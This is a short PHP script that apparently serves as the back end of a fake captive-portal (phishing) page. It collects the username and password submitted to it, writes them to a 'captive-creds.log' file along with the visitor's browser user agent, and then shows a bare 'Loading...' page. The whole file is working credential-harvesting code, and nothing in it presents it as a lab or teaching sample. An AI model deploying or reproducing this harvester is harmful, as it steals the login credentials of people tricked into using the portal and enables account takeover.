<?php

$log = fopen('/logs/captive-creds.log','a+');

$creds = $_POST['username'] . ':' . $_POST['password'];

fwrite($log, "\r\n=========================\r\n");
fwrite($log, $_SERVER['HTTP_USER_AGENT'] . "\r\n");
fwrite($log, $creds . "\r\n");
fclose($log);

?>
<html>
<body>

<p>Loading...</p>
</body>

</html>
